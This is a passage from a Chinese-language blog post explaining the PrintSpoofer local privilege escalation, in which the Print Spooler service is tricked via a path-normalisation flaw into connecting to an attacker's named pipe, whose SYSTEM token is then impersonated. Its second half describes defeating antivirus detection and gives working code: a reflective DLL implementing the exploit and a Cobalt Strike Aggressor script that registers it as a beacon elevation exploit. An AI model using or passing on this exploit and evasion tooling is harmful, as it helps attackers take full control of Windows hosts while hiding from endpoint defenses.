我们可以看到成功通过SYSTEM权限的令牌创建了进程`notepad.exe`
因此通过这个demo就已经基本清楚了我们的方向和步骤，只要能够让高权限进程和我们的管道进行连接，便可以通过管道模拟RPC客户端得到SYSTEM令牌后创建进程从提权
## 如何欺骗SYSTEM连接管道
作者是利用了 **打印机错误** 漏洞  
项目地址:
Windows的`MS-RPRN`协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的`RpcRemoteFindFirstPrinterChangeNotificationEx()`调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。  
其函数原型如下:
**pszLocalMachine：指向表示客户端计算机名称的字符串的指针。**
这意味着我们可以利用该错误通过`MS-RPRN RPC`接口强制Windows主机向其他机器进行身份验证,
**另外微软表示这个bug是系统设计特点，无需修复。**
但这和管道又有什么关系呢？答案是有的，我们来看Windows官方文档中给出打印机客户端的初始化说明:
这意味着`Print Spooler`服务的RPC接口其实是暴露在命名管道：`\\.\pipe\spoolss`，而该该项服务是默认开启的状态
我们可以通过[pipelist](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist)来查看:
此时又出现一个问题，本来打印机错误是针对攻击域控主机，连接域控主机然后在本地机器上接收通知，即本地扮演打印机客户端的角色，但是由于本地提权的原因，我们需要
**连接到本地机器并在本地机器上接收通知**
我们先使用原作者的项目[SpoolSample](https://github.com/leechristensen/SpoolSample)
如果我们都设置为本地机器时，此时会出现一个问题，该打印机漏洞利用的原理其实是
**强迫运行Spooler服务的任何主机通过Kerberos或者NTLM向攻击者选择的目标发起身份认证请求**
我们这里只需要强迫主机通过管道连接到我们的管道即可
但是在这里由于调用`RpcRemoteFindFirstPrinterChangeNotification(Ex)`方法，服务通知将发送到`\\AttackIP\pipe\spoolss`.
这个管道是由`NT AUTHORITY\SYSTEM`控制，而该管道已经存在因此我们不能创建自己的同名管道
当尝试在管道后面加入`\`来表示让`\\localhost\pipe\crispr`管道接受服务通知时我们可以看到调用其实会由于路径验证检查而失败,意味着同样还是使用`\pipe\spools`管道进行接收
而我们是想指定我们之前所写好的恶意管道进行接收，这样才能够模拟高权限RPC客户端从而创建进程，难道在这里就无法指定我们的恶意管道进行接收吗？
###  利用
回到我们之前的一张图
在官方文档中给出了[说明](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)，这里`pszLocalMachine`可以是一个UNC路径
因此如果SERVER_NAME是`\\127.0.0.1\`，系统用户会访问 `\\127.0.0.1\pipe\spoolss`
但如果是这样呢?
如果主机名包含`/`，它将通过路径验证检查，但是在计算要连接的命名管道的路径时，规范化会将其转换为`\`，并且系统还将其认为是IPC连接的方式去发送服务通知
因此，作者的思路便很容易产生了，我们将接收通知的主机名设置为`\\localhost/pipe/crispr`,由于路径规范化的问题，打印机服务器会误认为打印机客户端的管道为`\\localhost\pipe\crispr\pipe\spoolss`
而该管道和默认`\\.\pipe\spoolss`不是同一个管道，因此我们可以通过创建恶意管道`\\localhost\pipe\crispr\pipe\spoolss`来等待SYSTEM权限的`spoolsv.exe`进程连接我们的管道:
仍然通过前文的测试程序进行演示:
通过普通用户的权限成功提权至SYSTEM，并且列出了令牌的相关信息和权限情况，注意这里我们同样只是使用了具有`SeImpersonatePrivilege`特权的服务账户，具体原因[官方文档](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)中给出了答案
## 写在最后
原理分析到这已经到尾声，最后就是提权漏洞作者itm4n给出的Printspoofer的项目  
[https://github.com/itm4n/PrintSpoofer/tree/master/PrintSpoofer](https://)  
然而该程序显然已经被主机防护软件列为黑名单了，因此我们还需要在源代码的基础上做出修改以绕过主机防护软件的拦截
根据之前的文章，可以考虑全局修改`printspoofer`关键词进行绕过，这里全部修改为`pipeCrispr`后编译生成发现该种方法已经失效:
同样会被拦截，当再次尝试将输出内容全部简化并且输出一些不相关的字符串时重新编译运行可以看到此时防护软件已经不会将其识别成恶意文件，而只是发现进行提权操作，说明在这里我们的更改是部分有效的
当然这里都是可以过静态查杀，只是肯定需要动态运行进行提权，因此还需要绕过动态查杀，因此在这里我首先尝试使用前文的`testpipe.exe`结合`spoolSample`如果打开不是`cmd.exe`等进程并不会被拦截:
而当打开为`cmd.exe`进程时则会被提示可疑提权操作，因此判断可能是监控了进程树发现该进程产生了`cmd.exe`的子进程
正当我一筹莫展之时想到了不妨使用比较传统的加密免杀软件试试加密，这里我选择 **shellter**
,生成32位的程序，然后通过`shellter.exe`进行加密，不幸的是尝试过很多姿势都避免不了沙箱和动态查杀，因此想到了使用反射DLL注入的方式结合CS进行攻击
反射DLL已经有了比较成熟的项目，并且一般CS中编写反射注入DLL基本都是使用的该项目  
因此当我们构造一个`reflective_dll`进行反射注入，这样避免了文件落地，推测大概率不会被查杀
  * 1.导入相关的头文件：ReflectiveDllInjection.h、ReflectiveLoader.cpp、ReflectiveLoader.h
  * 2.将原来部分提权的操作放到`dllmain.cpp`中,主要是放在`DLL_PROCESS_ATTACH`中  
这里贴下`dllmain.cpp`的代码:
    #include "ReflectiveLoader.h"
    #include "PrintSpoofer.h"
    #include 
    extern HINSTANCE hAppInstance;
    EXTERN_C IMAGE_DOS_HEADER __ImageBase;
    BOOL PrintSpoofer() {
        BOOL bResult = TRUE;
        LPWSTR pwszPipeName = NULL;
        HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
        HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
        HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
        DWORD dwWait = 0;
        if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME)) {
            wprintf(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
            bResult = FALSE;
            goto cleanup;
        }
        wprintf(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);
        if (!GenerateRandomPipeName(&pwszPipeName)) {
            wprintf(L"[-] Failed to generate a name for the pipe.\n");
            bResult = FALSE;
            goto cleanup;
        }
        if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName))) {
            wprintf(L"[-] Failed to create a named pipe.\n");
            bResult = FALSE;
            goto cleanup;
        }
        if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe))) {
            wprintf(L"[-] Failed to connect the named pipe.\n");
            bResult = FALSE;
            goto cleanup;
        }
        wprintf(L"[+] Named pipe listening...\n");
        if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName))) {
            wprintf(L"[-] Failed to trigger the Spooler service.\n");
            bResult = FALSE;
            goto cleanup;
        }
        dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
        if (dwWait != WAIT_OBJECT_0) {
            wprintf(L"[-] Operation failed or timed out.\n");
            bResult = FALSE;
            goto cleanup;
        }
        if (!GetSystem(hSpoolPipe)) {
            bResult = FALSE;
            goto cleanup;
        }
        wprintf(L"[+] Exploit successfully, enjoy your shell\n");
    cleanup:
        if (hSpoolPipe)
            CloseHandle(hSpoolPipe);
        if (hSpoolPipeEvent)
            CloseHandle(hSpoolPipeEvent);
        if (hSpoolTriggerThread)
            CloseHandle(hSpoolTriggerThread);
        return bResult;
    }
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
        BOOL bReturnValue = TRUE;
        DWORD dwResult = 0;
        switch (dwReason) {
        case DLL_QUERY_HMODULE:
            if (lpReserved != NULL)
                *(HMODULE*)lpReserved = hAppInstance;
            break;
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            if (PrintSpoofer()) {
                fflush(stdout);
                if (lpReserved != NULL)
                    ((VOID(*)())lpReserved)();
            } else {
                fflush(stdout);
            }
            ExitProcess(0);
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
        }
        return bReturnValue;
    }
完成DLL的编写之后我们接下来在实现cna的编写即可:
    sub printspoofer {
        btask($1, "Task Beacon to run " . listener_describe($2) . " via PrintSpoofer");
        if (-is64 $1)
        {
            $arch = "x64";
            $dll = script_resource("PrintSpoofer.x64.dll");
        } else {
            $arch = "x86";
            $dll = script_resource("PrintSpoofer.x86.dll");
        }
        $stager = shellcode($2, false, $arch);
        bdllspawn!($1, $dll, $stager, "PrintSpoofer local elevate privilege", 5000);
        bstage($1, $null, $2, $arch);
    }
    beacon_exploit_register("PrintSpoofer", "PrintSpoofer local elecate privilege", &printspoofer);
通过反射DLL注入的方式最终实现了免杀
**项目地址:**  
[https://github.com/crisprss/PrintSpoofer  
](https://)
* * *
参考文章
  * 
  * 
  * 
  * [https://docs.microsoft.com/en-us/search/?scope=Desktop&terms=RpcRemoteFindFirstPrinterChangeNotificationEx(](https://docs.microsoft.com/en-us/search/?scope=Desktop&terms=RpcRemoteFindFirstPrinterChangeNotificationEx\())
  * 
  * 
  * 